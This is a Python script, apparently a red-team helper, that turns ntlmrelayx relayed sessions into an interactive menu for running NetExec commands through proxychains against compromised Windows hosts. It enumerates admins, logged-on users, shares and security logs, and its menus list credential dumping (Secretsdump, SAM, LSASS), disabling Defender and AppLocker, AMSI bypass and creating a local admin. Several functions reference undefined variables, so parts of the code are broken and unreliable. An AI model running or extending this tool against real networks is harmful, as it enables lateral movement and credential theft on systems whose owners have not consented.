import os
import sys
import argparse
import requests
from collections import defaultdict
import subprocess

# Function to fetch data from the ntlmrelayx HTTPAPI
def fetch_data_from_api(api_url):
    try:
        response = requests.get(api_url)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"Failed to fetch data from ntlmrelayx API: {e}")
        return []

# Function to filter the TRUE lines from the input file (backup option)
def filter_true_lines(file_path):
    true_lines = []
    if not file_path or not os.path.exists(file_path):
        return true_lines

    with open(file_path, 'r') as file:
        for line in file:
            parts = line.split()
            if len(parts) >= 4 and parts[3] == 'TRUE':
                ip = parts[1]
                domain_user = parts[2]
                true_lines.append([ip, domain_user])
    return true_lines

# Function to display the unique systems and users count
def display_unique_counts(true_lines, cache_ips, debug=False):
    unique_systems = set()
    unique_users = set()
    admin_systems = set()
    admin_users = set()

    for entry in true_lines:
        ip = entry[1]
        domain_user = entry[2]
        unique_systems.add(ip)
        unique_users.add(domain_user)
        if entry[3] == 'TRUE':
            admin_systems.add(ip)
            admin_users.add(domain_user)

    if debug:
        print(f"Systems: {list(unique_systems)}")  # Debugging information
        print(f"Users: {list(unique_users)}")  # Debugging information

    print(f"\nNumber of unique \033[1;34msystems\033[0m: \033[1m{len(unique_systems)}\033[0m (\033[1;33m{len(admin_systems)} with admin\033[0m)")
    print(f"Number of unique \033[1;34musers\033[0m: \033[1m{len(unique_users)}\033[0m (\033[1;33m{len(admin_users)} with admin\033[0m)")

    if cache_ips:
        print(f"\033[1mCache file exists. {len(cache_ips)} unique IPs found in the cache.\033[0m")

# Function to parse the cache file
def parse_cache(cache_file):
    if not os.path.exists(cache_file):
        return set(), {}

    cache_ips = set()
    cache_actions = defaultdict(set)
    with open(cache_file, 'r') as file:
        for line in file:
            if line.startswith("Action:"):
                action, ip = line.strip().split(": ")[1].split(" on ")
                cache_ips.add(ip)
                cache_actions[action].add(ip)
    return cache_ips, cache_actions

# Function to save action and IPs to the cache file
def update_cache(cache_file, action, ips):
    with open(cache_file, 'a') as file:
        for ip in ips:
            file.write(f"Action: {action} on {ip}\n")

# Function to get the user input for selecting systems
def select_systems(available_ips):
    while True:
        target = input("Enter an IP(s) or target 'all': ").strip().lower()
        if target in {'all', 'q', 'quit', 'exit', 'back'}:
            return target
        
        ips = [ip.strip() for ip in target.replace(',', ' ').replace(';', ' ').split()]
        valid_ips = [ip for ip in ips if ip in available_ips]

        if valid_ips:
            return valid_ips
        else:
            print("No valid IPs entered. Please try again.")

# Function to handle the execution of commands
def execute_command(ip, domain_user, action_name, output_file, exec_method=None, grep=None):
    domain, user = domain_user.split('/')
    base_command = f"proxychains4 -q nxc smb {ip} -d {domain} -u {user} -p ''"
    if exec_method:
        base_command += f" --exec-method {exec_method}"
    
    # Commands based on action name
    if action_name == "List local admins":
        command = f"{base_command} -x 'net localgroup Administrators'"
    elif action_name == "Logged on users":
        command = f"{base_command} --loggedon-users"
    elif action_name == "List shares":
        command = f"{base_command} --shares"
    elif action_name == "Logical drives":
        command = f"{base_command} --disks"
        # Alternative command commented out for reference
        # alternative_command = f"{base_command} -x 'wmic logicaldisk get caption'"
    elif action_name == "List security events":
        event_count = input("Default event count is 20. Press Enter to use the default or enter a number to change: ").strip()
        if not event_count.isdigit():
            event_count = "20"
        command = f"{base_command} -X 'Get-WinEvent -LogName Security -MaxEvents {event_count} | Format-Table TimeCreated, Id, LevelDisplayName, Message -AutoSize'"
    else:
        command = base_command

    print(f"\033[1m[ EXECUTING ] {command}\033[0m")

    try:
        # Preserve color output by setting 'PYTHONIOENCODING' to 'utf-8' and using subprocess to pass the command
        result = subprocess.run(command, shell=True, text=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout + result.stderr

        if grep:
            output = subprocess.run(f"echo \"{output}\" | grep {grep}", shell=True, capture_output=True, text=True).stdout

        if output_file:
            with open(output_file, 'a') as f:
                f.write(f"\n[OUTPUT FOR {ip} - {domain_user}]\n{output}\n")
        else:
            print(output)
    except subprocess.CalledProcessError as e:
        print(f"Command failed: {e}")

    # Re-check cache and actions status immediately after execution
    update_cache_status(cache_file)

# Function to update cache status and re-check after action
def update_cache_status(cache_file):
    cache_ips, cache_actions = parse_cache(cache_file)  # Re-read cache to ensure it's up to date

    completed = set(cache_actions.get(action_name, []))
    if len(completed) == len(available_ips):
        cache_actions[action_name] = available_ips  # Mark as complete

# Function to display the main menu
def display_menu(title, options, cache_actions, available_ips, back_option=True):
    print(f"\n\033[1m{title}\033[0m")
    for i, option in enumerate(options, start=1):
        action_name = option.split("[")[0].strip()  # Extract the action name
        if action_name in cache_actions:
            if len(cache_actions[action_name]) == len(available_ips):
                option = f"\033[1;32m[ COMPLETE - ADM ]\033[0m {option}"
            else:
                option = f"\033[1;33m[ PARTIAL ]\033[0m {option}"
        if "[ UNAVAILABLE ]" in option:
            option = f"\033[1;31m{option}\033[0m"  # Bold red for unavailable actions
        print(f"{i}. {option}")
    if back_option:
        print("0. Back")

# Function to handle the action selection and execution
def handle_action_selection(category, true_lines, cache_file, cache_actions, args):
    options = {
        "Enumeration": [
            ">> Domain info <<",
            "List local users",
            "List local admins",
            "Logged on users",
            "List shares",
            "Logical drives",
            "List security events"
        ],
        "Execution": [
            "List \"C:\\\"",
            "List alternate drive",
            "Spider filesystem for pattern",
            "\033[1;31m[ UNAVAILABLE ] nxc GET\033[0m",
            "\033[1;31m[ UNAVAILABLE ] nxc PUT\033[0m",
            "\033[1;31m[ UNAVAILABLE ] nxc command (cmd.exe) - (WARNING: no shell or interactives, only execution or stdout)\033[0m",
            "\033[1;31m[ UNAVAILABLE ] nxc command (PowerShell) - (WARNING: no shell or interactives, only execution or stdout)\033[0m",
            "\033[1;31m[ UNAVAILABLE ] Disable Windows Defender\033[0m",
            "\033[1;31m[ UNAVAILABLE ] Disable AppLocker\033[0m",
            "\033[1;31m[ UNAVAILABLE ] AMSI Bypass\033[0m"
        ],
        "Credentials": [
            "Secretsdump",
            "\033[1;31m[ UNAVAILABLE ] nxc SAM\033[0m",
            "\033[1;31m[ UNAVAILABLE ] nxc LSA\033[0m",
            "\033[1;31m[ UNAVAILABLE ] nxc LSASS\033[0m",
            "\033[1;31m[ UNAVAILABLE ] nxc nanodump\033[0m"
        ],
        "Persistence": [
            ">> Create local admin <<",
            "\033[1;31m[ UNAVAILABLE ] Retrieve remote file (download)\033[0m",
            "\033[1;31m[ UNAVAILABLE ] Send local file (upload)\033[0m"
        ]
    }
    
    available_ips = set(entry[1] for entry in true_lines if entry[3] == 'TRUE')
    display_menu(category, options[category], cache_actions, available_ips)

    selection = input("> ").strip().lower()
    
    if selection in {'q', 'quit', 'exit'}:
        sys.exit()

    if selection == '0':
        return
    
    if selection.isdigit():
        selection = int(selection)
        if 0 < selection <= len(options[category]):
            action = options[category][selection - 1]
            
            if "[ UNAVAILABLE ]" in action:
                print("This action is currently unavailable.")
                return
            
            # Handle directory navigation (if applicable)
            if ">>" in action:
                sub_category = action.replace(">>", "").strip()
                handle_action_selection(sub_category, true_lines, cache_file, cache_actions, args)
                return
            
            # Handle actual actions
            action_name = action.split("[")[0].strip()  # Extract the action name

            # Select systems to target
            target_ips = select_systems(available_ips)
            if isinstance(target_ips, list):
                # Execute command for the first selected IP
                first_ip = target_ips[0]
                first_admin_user = None
                for entry in true_lines:
                    if entry[1] == first_ip and entry[3] == 'TRUE':
                        first_admin_user = entry[2]
                        break
                
                if first_admin_user:
                    execute_command(first_ip, first_admin_user, action_name, args.output_file, args.exec_method, args.grep)
                    update_cache(cache_file, action_name, [first_ip])
                else:
                    print(f"No known admin user found for {first_ip}. Skipping.")

                # If more than one IP was provided, prompt to continue
                if len(target_ips) > 1:
                    proceed = input("Do you want to continue with the remaining systems? (y/n): ").strip().lower()
                    if proceed == 'n':
                        return
                
                # Execute command for the remaining selected IPs
                for ip in target_ips[1:]:
                    admin_user = None
                    for entry in true_lines:
                        if entry[1] == ip and entry[3] == 'TRUE':
                            admin_user = entry[2]
                            break
                    if admin_user:
                        execute_command(ip, admin_user, action_name, args.output_file, args.exec_method, args.grep)
                        update_cache(cache_file, action_name, [ip])
                    else:
                        print(f"No known admin user found for {ip}. Skipping.")
            else:
                # If target_ips is not a list, it's either 'all' or a control command
                if target_ips == 'all':
                    remaining_ips = available_ips.copy()

                    # Execute command for the first system
                    first_ip = remaining_ips.pop()
                    first_admin_user = None
                    for entry in true_lines:
                        if entry[1] == first_ip and entry[3] == 'TRUE':
                            first_admin_user = entry[2]
                            break
                    
                    if first_admin_user:
                        execute_command(first_ip, first_admin_user, action_name, args.output_file, args.exec_method, args.grep)
                        update_cache(cache_file, action_name, [first_ip])
                    else:
                        print(f"No known admin user found for {first_ip}. Skipping.")
                    
                    # Prompt to continue with remaining systems
                    if remaining_ips:
                        proceed = input("Do you want to continue with the remaining systems? (y/n): ").strip().lower()
                        if proceed == 'n':
                            return
                    
                    # Execute command for the remaining systems
                    for ip in remaining_ips:
                        admin_user = None
                        for entry in true_lines:
                            if entry[1] == ip and entry[3] == 'TRUE':
                                admin_user = entry[2]
                                break
                        if admin_user:
                            execute_command(ip, admin_user, action_name, args.output_file, args.exec_method, args.grep)
                            update_cache(cache_file, action_name, [ip])
                        else:
                            print(f"No known admin user found for {ip}. Skipping.")
                elif target_ips in {'q', 'quit', 'exit', 'back'}:
                    return

            # Re-check cache and actions status
            update_cache_status(cache_file)

            # Fresh pull from API to check for new systems/users
            fresh_data = fetch_data_from_api(f"http://127.0.0.1:{args.port}/ntlmrelayx/api/v1.0/relays")
            new_true_lines = [entry for entry in fresh_data if entry not in true_lines]
            if new_true_lines:
                new_systems = set(entry[1] for entry in new_true_lines)
                new_admin_systems = set(entry[1] for entry in new_true_lines if entry[3] == 'TRUE')
                new_users = set(entry[2] for entry in new_true_lines)
                new_admin_users = set(entry[2] for entry in new_true_lines if entry[3] == 'TRUE')

                # Compare with existing systems and users
                existing_systems = set(entry[1] for entry in true_lines)
                existing_users = set(entry[2] for entry in true_lines)

                actual_new_systems = new_systems - existing_systems
                actual_new_admin_systems = new_admin_systems - existing_systems
                new_users_for_existing_systems = {entry[2] for entry in new_true_lines if entry[1] in existing_systems and entry[2] not in existing_users}

                print(f"\033[1;34mNew systems detected\033[0m: \033[1m{len(actual_new_systems)}\033[0m (\033[1;33m{len(actual_new_admin_systems)} with admin\033[0m)")
                print(f"\033[1;34mNew users detected\033[0m: \033[1m{len(new_users_for_existing_systems)}\033[0m (\033[1;33m{len(new_admin_users & new_users_for_existing_systems)} with admin\033[0m)")
                true_lines.extend(new_true_lines)
    
    else:
        print("Invalid selection. Please try again.")

def main():
    parser = argparse.ArgumentParser(description="Process ntlmrelayx socks output.")
    parser.add_argument("--input_file", help="Path to the input text file (optional).")
    parser.add_argument("--output_file", help="Path to the output file (optional). If not provided, output will be printed to screen.")
    parser.add_argument("--grep", help="Grep the output of commands.", default=None)
    parser.add_argument("--no-cache", action="store_true", help="Run without using the cache file.")
    parser.add_argument("--port", type=int, default=9090, help="Port for ntlmrelayx HTTPAPI (default: 9090).")
    parser.add_argument("--exec_method", choices=["wmiexec", "smbexec", "mmcexec", "atexec"], help="Specify the exec-method to use.")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode to print systems and users data.")
    
    args = parser.parse_args()

    api_url = f"http://127.0.0.1:{args.port}/ntlmrelayx/api/v1.0/relays"
    true_lines = fetch_data_from_api(api_url)

    if not true_lines and args.input_file:
        print(f"Failed to fetch data from the API. Falling back to input file: {args.input_file}")
        true_lines = filter_true_lines(args.input_file)

    if not true_lines:
        print("No valid data available from the API or the input file.")
        sys.exit(1)

    # Parse or initialize the cache
    cache_file = "cache.txt"
    cache_ips, cache_actions = parse_cache(cache_file) if not args.no_cache else (set(), {})

    # Display system and user information
    display_unique_counts(true_lines, cache_ips, debug=args.debug)

    # Main menu
    while True:
        # Fresh pull from API to check for new systems/users
        fresh_data = fetch_data_from_api(api_url)
        new_true_lines = [entry for entry in fresh_data if entry not in true_lines]
        if new_true_lines:
            new_systems = set(entry[1] for entry in new_true_lines)
            new_admin_systems = set(entry[1] for entry in new_true_lines if entry[3] == 'TRUE')
            new_users = set(entry[2] for entry in new_true_lines)
            new_admin_users = set(entry[2] for entry in new_true_lines if entry[3] == 'TRUE')

            # Compare with existing systems and users
            existing_systems = set(entry[1] for entry in true_lines)
            existing_users = set(entry[2] for entry in true_lines)

            actual_new_systems = new_systems - existing_systems
            actual_new_admin_systems = new_admin_systems - existing_systems
            new_users_for_existing_systems = {entry[2] for entry in new_true_lines if entry[1] in existing_systems and entry[2] not in existing_users}

            print(f"\033[1;34mNew systems detected\033[0m: \033[1m{len(actual_new_systems)}\033[0m (\033[1;33m{len(actual_new_admin_systems)} with admin\033[0m)")
            print(f"\033[1;34mNew users detected\033[0m: \033[1m{len(new_users_for_existing_systems)}\033[0m (\033[1;33m{len(new_admin_users & new_users_for_existing_systems)} with admin\033[0m)")
            true_lines.extend(new_true_lines)

        categories = ["Enumeration", "Execution", "Credentials", "Persistence"]
        display_menu("Main Menu", categories, cache_actions, set(entry[1] for entry in true_lines if entry[3] == 'TRUE'), back_option=False)

        selection = input("> ").strip().lower()
        
        if selection in {'q', 'quit', 'exit'}:
            sys.exit()
        
        if selection.isdigit():
            selection = int(selection)
            if 0 < selection <= len(categories):
                handle_action_selection(categories[selection - 1], true_lines, cache_file, cache_actions, args)
            else:
                print("Invalid selection. Please try again.")
        else:
            print("Invalid selection. Please try again.")

if __name__ == "__main__":
    main()
